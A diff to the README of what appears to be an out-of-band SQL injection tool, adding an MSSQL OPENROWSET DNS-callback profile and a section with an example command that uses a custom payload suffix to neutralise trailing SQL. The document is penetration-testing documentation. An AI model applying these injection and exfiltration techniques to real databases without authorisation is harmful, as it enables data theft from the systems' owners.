@@ -361,6 +361,7 @@ Current profiles:
 |---|---|---|
 | `mssql` | MSSQL stacked query via `xp_dirtree` | Requires stacked queries and access to `xp_dirtree`. |
 | `mssql-cmdshell` | MSSQL `xp_cmdshell` nslookup callback | Alternative when `xp_dirtree` is blocked; requires `xp_cmdshell` enabled. |
+| `mssql-openrowset` | MSSQL `OPENROWSET` DNS callback via `IF (…) EXEC(…)` | Linux-compatible alternative — `xp_dirtree`/`xp_cmdshell` do not resolve outbound DNS on SQL Server for Linux. Requires `Ad Hoc Distributed Queries` enabled. |
 | `mysql` | MySQL `LOAD_FILE('\\\\host\\x')` | Usually depends on Windows/UNC behavior and file privileges. |
 | `mysql-stacked` | MySQL `LOAD_FILE` via stacked query | For multi-statement enabled targets; requires FILE privilege. |
 | `oracle-http` | Oracle `UTL_HTTP.REQUEST()` | Requires network ACL/package access. |
@@ -379,6 +380,28 @@ Metadata enumeration uses DBMS-specific catalog queries:
 - PostgreSQL: `information_schema.tables`, `information_schema.columns`
 - Oracle: `all_tables`, `all_tab_columns`
 - SQLite HTTP profile: `sqlite_master` for table names
+
+### Trailing SQL after the injection point
+
+Stacked MSSQL profiles (`mssql`, `mssql-cmdshell`, `mssql-openrowset`)
+break out of the injected string and terminate with `-- -` or `/*`. When
+the vulnerable query has more SQL *after* the injection point — for
+example a condition on its own line, `... = '<INJECT>'` followed by a
+newline and `AND is_admin = 1` — neither terminator can neutralize it:
+`-- -` only comments to end-of-line, and T-SQL requires `/*` block
+comments to be explicitly closed. Use `--payload-suffix` to supply a
+custom tail that consumes the leftover SQL. For a target whose query
+ends with `AND u.is_admin = 1`, a suffix that reopens a valid statement
+works:
+
+```bash
+oobmap ... --dbms mssql-openrowset \
+  --payload-suffix ";SELECT 1 FROM dbo.users u WHERE '1'='1"
+```
+
+`--payload-suffix` strips the profile's own terminator first, then
+appends your tail, so the trailing `AND u.is_admin = 1` becomes part of a
+valid reopened statement instead of a syntax error.
 
 ## WAF Bypass / Tampers
 
